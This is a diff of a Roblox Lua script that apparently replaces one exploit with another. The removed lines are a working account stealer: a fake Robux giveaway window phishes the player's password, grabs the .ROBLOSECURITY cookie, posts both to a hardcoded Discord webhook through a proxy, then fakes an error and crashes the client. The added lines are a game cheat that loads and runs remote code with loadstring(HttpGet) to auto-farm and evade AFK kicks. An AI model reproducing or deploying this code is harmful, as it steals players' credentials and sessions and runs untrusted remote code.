@@ -1,155 +1,334 @@
-local WebhookURL = "https://discord.com/api/webhooks/1470696581912072363/9dPRhbYSPrUMEt9OtrjUicl2795SD4yPZFoceDxDWL04MXM4MIr7MCY6a5gEIZwxgvfV"
-local ProxyURL = "https://cors-anywhere.herokuapp.com/" .. WebhookURL  -- THAY BẰNG PROXY THẬT CỦA MÀY (tìm free Roblox Discord proxy 2026)
-local HttpService = game:GetService("HttpService")
-local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local TweenService = game:GetService("TweenService")
-local Debris = game:GetService("Debris")
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
-local function SendData(content, cookie)
-    local data = {
-        ["embeds"] = {{
-            ["title"] = "🔥 CHIẾN THẦN ĐÃ HỐT ĐƯỢC HÀNG 🔥",
-            ["color"] = 16711680,
-            ["fields"] = {
-                {["name"] = "Tên tài khoản", ["value"] = "```" .. LocalPlayer.Name .. "```", ["inline"] = true},
-                {["name"] = "ID người chơi", ["value"] = "```" .. LocalPlayer.UserId .. "```", ["inline"] = true},
-                {["name"] = "Mật khẩu nhập vào", ["value"] = "```" .. content .. "```", ["inline"] = false},
-                {["name"] = "Cookie (.ROBLOSECURITY)", ["value"] = "```" .. cookie .. "```", ["inline"] = false}
-            },
-            ["footer"] = {["text"] = "Bú acc thành công lúc: " .. os.date("%X")}
-        }}
-    }
-    local success, err = pcall(function()
-        local req = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
-        if req then
-            local response = req({
-                Url = ProxyURL,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json", ["Origin"] = "null"},
-                Body = HttpService:JSONEncode(data)
-            })
-            if response.StatusCode == 200 or response.StatusCode == 204 then
-                -- sent ok
-            else
-                -- debug nếu fail
-            end
-        end
-    end)
-    if not success then
-        -- silent fail
-    end
+local Window = Rayfield:CreateWindow({
+   Name = "Brainrot Tsunami - Ultimate Smart Farmer",
+   LoadingTitle = "Loading Dark System...",
+   LoadingSubtitle = "by UNRESTRICTED DARK BRO",
+   ConfigurationSaving = {
+      Enabled = true,
+      FolderName = "BrainrotUltimateFarm",
+      FileName = "DarkConfig"
+   },
+   KeySystem = false
+})
+
+-- Ngôn ngữ pack
+local LanguagePack = {
+   English = {
+      WindowName = "Brainrot Tsunami - Ultimate Smart Farmer",
+      LoadingTitle = "Loading Dark System...",
+      LoadingSubtitle = "by UNRESTRICTED DARK BRO",
+      MainTabName = "Main Farm",
+      SettingsTabName = "Settings",
+      AutoFarmSection = "Auto Farm Brainrot Features",
+      AreaDropdownName = "Select Farm Area (Smart Wave Check)",
+      FarmToggleName = "Enable Auto Farm (Smart Wave Detection)",
+      CollectToggleName = "Enable Auto Collect Brainrot (If Available)",
+      AntiAFKToggleName = "Enable Anti-AFK (Random Jump)",
+      SettingsSection = "Advanced Settings",
+      SafeSliderName = "Safe Distance Before Wave",
+      SafeSliderSuffix = "Studs",
+      BufferSliderName = "End Area Buffer (Wait for Wave Pass)",
+      BufferSliderSuffix = "Studs",
+      SpeedSliderName = "Tween Movement Speed",
+      SpeedSliderSuffix = "Speed",
+      LanguageLabel = "Language",
+      StatusLabelPrefix = "Status: ",
+      NotifyTitle = "Ready to Destroy!",
+      NotifyContent = "Ultimate Script Loaded! Let's Farm!",
+      Areas = {"Uncommon", "Common", "Rare", "Legendary", "Universe", "Secret", "Heaven"},
+      StatusMoving = "Moving to ",
+      StatusWaitingWave = "Wave Ahead / In Zone! Waiting...",
+      StatusWaveClose = "Wave Too Close! Holding...",
+      StatusAtTarget = "Reached Area: ",
+      StatusError = "Error: ",
+      StatusIdle = "Idle / Off"
+   },
+   Vietnamese = {
+      WindowName = "Brainrot Tsunami - Ultimate Smart Farmer",
+      LoadingTitle = "Đang khởi động hệ thống đen tối...",
+      LoadingSubtitle = "by UNRESTRICTED DARK BRO",
+      MainTabName = "Farm Chính",
+      SettingsTabName = "Cài Đặt",
+      AutoFarmSection = "Chức Năng Auto Farm Brainrot",
+      AreaDropdownName = "Chọn Khu Vực Farm (Check Sóng Thông Minh)",
+      FarmToggleName = "Bật Auto Farm (Phát Hiện Sóng Xịn)",
+      CollectToggleName = "Bật Auto Thu Thập Brainrot (Nếu Có)",
+      AntiAFKToggleName = "Bật Chống AFK (Nhảy Ngẫu Nhiên)",
+      SettingsSection = "Cài Đặt Nâng Cao",
+      SafeSliderName = "Khoảng Cách An Toàn Trước Sóng",
+      SafeSliderSuffix = "Studs",
+      BufferSliderName = "Buffer Cuối Khu (Chờ Sóng Qua)",
+      BufferSliderSuffix = "Studs",
+      SpeedSliderName = "Tốc Độ Di Chuyển Tween",
+      SpeedSliderSuffix = "Tốc Độ",
+      LanguageLabel = "Ngôn Ngữ",
+      StatusLabelPrefix = "Trạng Thái: ",
+      NotifyTitle = "Sẵn Sàng Quẩy!",
+      NotifyContent = "Script Ultimate Đã Load! Farm Tung Nát Game!",
+      Areas = {"Uncommon", "Common", "Hiếm", "Huyền Thoại", "Vũ Trụ", "Secret", "Thiên Đường"},
+      StatusMoving = "Đang di chuyển tới ",
+      StatusWaitingWave = "Sóng Phía Trước / Trong Khu! Chờ...",
+      StatusWaveClose = "Sóng Gần Quá! Đứng Im...",
+      StatusAtTarget = "Đã đến khu: ",
+      StatusError = "Lỗi: ",
+      StatusIdle = "Đang Tắt / Nghỉ"
+   }
+}
+
+-- Biến global
+local CurrentLang = "English"  -- Default English
+local Lang = LanguagePack[CurrentLang]
+
+local _G = {
+    AutoFarm = false,
+    SelectedArea = "Common",
+    SafeDistance = 20,
+    EndBuffer = 25,
+    AutoCollect = true,
+    AntiAFK = true,
+    TweenSpeed = 50
+}
+
+local Areas = {
+    ["Uncommon"] = {startZ = 150, endZ = 250, midPos = Vector3.new(200, 5, 200)},
+    ["Common"] = {startZ = 50, endZ = 150, midPos = Vector3.new(100, 5, 100)},
+    ["Rare"] = {startZ = 250, endZ = 350, midPos = Vector3.new(300, 5, 300)},
+    ["Legendary"] = {startZ = 350, endZ = 450, midPos = Vector3.new(400, 5, 400)},
+    ["Universe"] = {startZ = 450, endZ = 550, midPos = Vector3.new(500, 5, 500)},
+    ["Secret"] = {startZ = 550, endZ = 650, midPos = Vector3.new(600, 5, 600)},
+    ["Heaven"] = {startZ = 650, endZ = 750, midPos = Vector3.new(700, 5, 700)}
+}
+
+-- Biến UI để reload khi đổi ngôn ngữ
+local MainTab, SettingsTab, StatusLabel, AreaDropdown, FarmToggle, CollectToggle, AntiAFKToggle
+local SafeSlider, BufferSlider, SpeedSlider
+
+function ReloadUI()
+   -- Destroy old tabs if exist
+   if MainTab then MainTab:Destroy() end
+   if SettingsTab then SettingsTab:Destroy() end
+   
+   Lang = LanguagePack[CurrentLang]
+   
+   MainTab = Window:CreateTab(Lang.MainTabName, 4483362458)
+   local MainSection = MainTab:CreateSection(Lang.AutoFarmSection)
+   
+   AreaDropdown = MainTab:CreateDropdown({
+      Name = Lang.AreaDropdownName,
+      Options = Lang.Areas,
+      CurrentOption = {Lang.Areas[2]},  -- Default Common (index 2 in list)
+      MultipleOptions = false,
+      Callback = function(Option)
+         _G.SelectedArea = Option[1]
+      end
+   })
+   
+   FarmToggle = MainTab:CreateToggle({
+      Name = Lang.FarmToggleName,
+      CurrentValue = false,
+      Flag = "FarmToggle",
+      Callback = function(Value)
+         _G.AutoFarm = Value
+         if Value then
+            UltimateSmartFarmLoop()
+         end
+      end
+   })
+   
+   CollectToggle = MainTab:CreateToggle({
+      Name = Lang.CollectToggleName,
+      CurrentValue = true,
+      Flag = "CollectToggle",
+      Callback = function(Value)
+         _G.AutoCollect = Value
+      end
+   })
+   
+   AntiAFKToggle = MainTab:CreateToggle({
+      Name = Lang.AntiAFKToggleName,
+      CurrentValue = true,
+      Flag = "AntiAFKToggle",
+      Callback = function(Value)
+         _G.AntiAFK = Value
+         if Value then
+            AntiAFKLoop()
+         end
+      end
+   })
+   
+   StatusLabel = MainTab:CreateLabel(Lang.StatusLabelPrefix .. Lang.StatusIdle)
+   
+   SettingsTab = Window:CreateTab(Lang.SettingsTabName, 4483362458)
+   local SettingsSection = SettingsTab:CreateSection(Lang.SettingsSection)
+   
+   SafeSlider = SettingsTab:CreateSlider({
+      Name = Lang.SafeSliderName,
+      Range = {10, 50},
+      Increment = 5,
+      Suffix = Lang.SafeSliderSuffix,
+      CurrentValue = 20,
+      Flag = "SafeSlider",
+      Callback = function(Value)
+         _G.SafeDistance = Value
+      end
+   })
+   
+   BufferSlider = SettingsTab:CreateSlider({
+      Name = Lang.BufferSliderName,
+      Range = {10, 50},
+      Increment = 5,
+      Suffix = Lang.BufferSliderSuffix,
+      CurrentValue = 25,
+      Flag = "BufferSlider",
+      Callback = function(Value)
+         _G.EndBuffer = Value
+      end
+   })
+   
+   SpeedSlider = SettingsTab:CreateSlider({
+      Name = Lang.SpeedSliderName,
+      Range = {30, 100},
+      Increment = 5,
+      Suffix = Lang.SpeedSliderSuffix,
+      CurrentValue = 50,
+      Flag = "SpeedSlider",
+      Callback = function(Value)
+         _G.TweenSpeed = Value
+      end
+   })
+   
+   local LangDropdown = SettingsTab:CreateDropdown({
+      Name = Lang.LanguageLabel,
+      Options = {"English", "Tiếng Việt"},
+      CurrentOption = {CurrentLang},
+      MultipleOptions = false,
+      Callback = function(Option)
+         CurrentLang = Option[1]
+         ReloadUI()  -- Reload toàn bộ UI khi đổi ngôn ngữ
+      end
+   })
 end
 
-local function GetCookie()
-    local cookie = "N/A (Executor không hỗ trợ)"
-    if getcookies then
-        local c = getcookies("https://www.roblox.com")
-        for _, v in pairs(c) do
-            if v.Name == ".ROBLOSECURITY" then
-                cookie = v.Value
-                break
-            end
-        end
-    end
-    return cookie
+-- Khởi tạo UI lần đầu
+ReloadUI()
+
+function UpdateStatus(text)
+   if StatusLabel then
+      StatusLabel:Set(Lang.StatusLabelPrefix .. text)
+   end
 end
 
-local function CrashClientFake261()
-    local ScreenGui = Instance.new("ScreenGui")
-    ScreenGui.Parent = game:GetService("CoreGui")
-    ScreenGui.IgnoreGuiInset = true
-
-    local Frame = Instance.new("Frame")
-    Frame.Parent = ScreenGui
-    Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
-    Frame.BackgroundTransparency = 0.5
-    Frame.Size = UDim2.new(1, 0, 1, 0)
-
-    local Text = Instance.new("TextLabel")
-    Text.Parent = Frame
-    Text.Size = UDim2.new(0.8, 0, 0.2, 0)
-    Text.Position = UDim2.new(0.1, 0, 0.4, 0)
-    Text.BackgroundTransparency = 1
-    Text.Text = "Đang xác thực... Kết nối server thất bại. Vui lòng chờ."
-    Text.TextColor3 = Color3.fromRGB(255, 0, 0)
-    Text.TextScaled = true
-    Text.Font = Enum.Font.GothamBlack
-
-    wait(5 + math.random(2, 4))  -- fake lâu hơn
-
-    local fakeHint = Instance.new("Hint")
-    fakeHint.Parent = workspace
-    fakeHint.Text = "There was a problem streaming data, please reconnect. (Error Code: 261)"
-    Debris:AddItem(fakeHint, 10)
-
-    ScreenGui:Destroy()
-
-    -- Crash client bằng infinite loop + error để simulate disconnect 261
-    spawn(function()
-        while true do
-            local t = {}
-            for i = 1, 1000000 do
-                t[i] = Instance.new("Part")
-            end
-            wait()
-        end
-    end)
+function GetPlayerCharacter()
+   local player = game.Players.LocalPlayer
+   local character = player.Character
+   if not character or not character:FindFirstChild("HumanoidRootPart") then
+      character = player.CharacterAdded:Wait()
+   end
+   return character
 end
 
-local ScreenGui = Instance.new("ScreenGui")
-local Main = Instance.new("Frame")
-local UICorner = Instance.new("UICorner")
-local Title = Instance.new("TextLabel")
-local Desc = Instance.new("TextLabel")
-local Input = Instance.new("TextBox")
-local Submit = Instance.new("TextButton")
+function IsWaveInFront(playerZ, tsunamiZ, startZ, endZ)
+   if tsunamiZ > playerZ and tsunamiZ < startZ then return true end
+   if playerZ >= startZ and playerZ <= endZ and tsunamiZ >= startZ and tsunamiZ <= endZ then return true end
+   if playerZ > endZ and playerZ < endZ + _G.EndBuffer and tsunamiZ <= endZ + _G.EndBuffer then return true end
+   return false
+end
 
-ScreenGui.Parent = game:GetService("CoreGui")
-Main.Name = "FreeRobuxAdmin"
-Main.Parent = ScreenGui
-Main.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-Main.Position = UDim2.new(0.5, -150, 0.5, -75)
-Main.Size = UDim2.new(0, 300, 0, 150)
-Main.Active = true
-Main.Draggable = true
+function TweenToPosition(hrp, targetPos)
+   local distance = (hrp.Position - targetPos).Magnitude
+   local tweenInfo = TweenInfo.new(distance / _G.TweenSpeed, Enum.EasingStyle.Linear)
+   local tween = game:GetService("TweenService"):Create(hrp, tweenInfo, {CFrame = CFrame.new(targetPos)})
+   tween:Play()
+   tween.Completed:Wait()
+end
 
-UICorner.Parent = Main
+function UltimateSmartFarmLoop()
+   spawn(function()
+      while _G.AutoFarm do
+         local success, err = pcall(function()
+            local character = GetPlayerCharacter()
+            local hrp = character:WaitForChild("HumanoidRootPart", 5)
+            if not hrp then return end
+            local humanoid = character:WaitForChild("Humanoid", 5)
+            if not humanoid then return end
+            
+            local area = Areas[_G.SelectedArea]
+            if not area then return end
+            local targetPos = area.midPos
+            local startZ = area.startZ
+            local endZ = area.endZ
+            local playerZ = hrp.Position.Z
+            
+            local tsunami = workspace:FindFirstChild("Tsunami")
+            local tsunamiZ = tsunami and tsunami.Position.Z or math.huge
+            
+            UpdateStatus("Checking Wave...")
+            
+            if (hrp.Position - targetPos).Magnitude < 5 then
+               UpdateStatus(Lang.StatusAtTarget .. _G.SelectedArea)
+               if _G.AutoCollect then
+                  local collectRemote = game.ReplicatedStorage:FindFirstChild("CollectBrainrot") -- Thay tên remote nếu khác
+                  if collectRemote and collectRemote:IsA("RemoteEvent") then
+                     collectRemote:FireServer()
+                  end
+               end
+               task.wait(1)
+               return
+            end
+            
+            if tsunami and math.abs(tsunamiZ - playerZ) < _G.SafeDistance then
+               UpdateStatus(Lang.StatusWaveClose)
+               task.wait(1)
+               return
+            end
+            
+            if tsunami and IsWaveInFront(playerZ, tsunamiZ, startZ, endZ) then
+               UpdateStatus(Lang.StatusWaitingWave)
+               task.wait(1)
+               return
+            end
+            
+            UpdateStatus(Lang.StatusMoving .. _G.SelectedArea)
+            TweenToPosition(hrp, targetPos)
+         end)
+         if not success then
+            UpdateStatus(Lang.StatusError .. tostring(err))
+         end
+         task.wait(0.2)
+      end
+      UpdateStatus(Lang.StatusIdle)
+   end)
+end
 
-Title.Parent = Main
-Title.Size = UDim2.new(1, 0, 0, 30)
-Title.Text = "ROBUX GIVEAWAY SYSTEM"
-Title.TextColor3 = Color3.fromRGB(255, 255, 255)
-Title.TextSize = 14
-Title.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+function AntiAFKLoop()
+   spawn(function()
+      while _G.AntiAFK do
+         local character = GetPlayerCharacter()
+         local humanoid = character and character:FindFirstChild("Humanoid")
+         if humanoid then
+            humanoid.Jump = true
+            task.wait(math.random(8, 25))
+            humanoid.Jump = false
+         end
+         task.wait(2)
+      end
+   end)
+end
 
-Desc.Parent = Main
-Desc.Position = UDim2.new(0, 0, 0, 35)
-Desc.Size = UDim2.new(1, 0, 0, 30)
-Desc.Text = "Nhập mật khẩu để xác nhận nhận 10,000 Robux"
-Desc.TextColor3 = Color3.fromRGB(200, 200, 200)
-Desc.TextSize = 12
+Rayfield:Notify({
+   Title = Lang.NotifyTitle,
+   Content = Lang.NotifyContent,
+   Duration = 6,
+   Image = 4483362458,
+   Actions = {
+      Ignore = {
+         Name = "OK Boss",
+         Callback = function() end
+      }
+   }
+})
 
-Input.Parent = Main
-Input.Position = UDim2.new(0, 25, 0, 70)
-Input.Size = UDim2.new(0, 250, 0, 30)
-Input.PlaceholderText = "Mật khẩu..."
-Input.Text = ""
-Input.TextSecurity = true
-
-Submit.Parent = Main
-Submit.Position = UDim2.new(0, 25, 0, 110)
-Submit.Size = UDim2.new(0, 250, 0, 30)
-Submit.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
-Submit.Text = "NHẬN NGAY"
-Submit.TextColor3 = Color3.fromRGB(255, 255, 255)
-
-Submit.MouseButton1Click:Connect(function()
-    local pass = Input.Text
-    if pass ~= "" then
-        local cookie = GetCookie()
-        SendData(pass, cookie)
-        Main:Destroy()
-        CrashClientFake261()
-    end
-end)
+if _G.AntiAFK then
+   AntiAFKLoop()
+end
